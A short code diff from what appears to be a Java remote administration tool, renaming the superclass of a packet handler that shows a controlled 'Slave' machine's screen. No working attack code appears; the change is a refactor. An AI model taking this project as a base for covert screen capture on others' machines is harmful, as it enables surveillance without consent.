@@ -6,7 +6,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameQuickRemoteScreen;
 import com.redpois0n.utils.ImageUtils;
 
-public class PacketQUICKDESKTOP extends Packet {
+public class PacketQUICKDESKTOP extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String header) throws Exception {
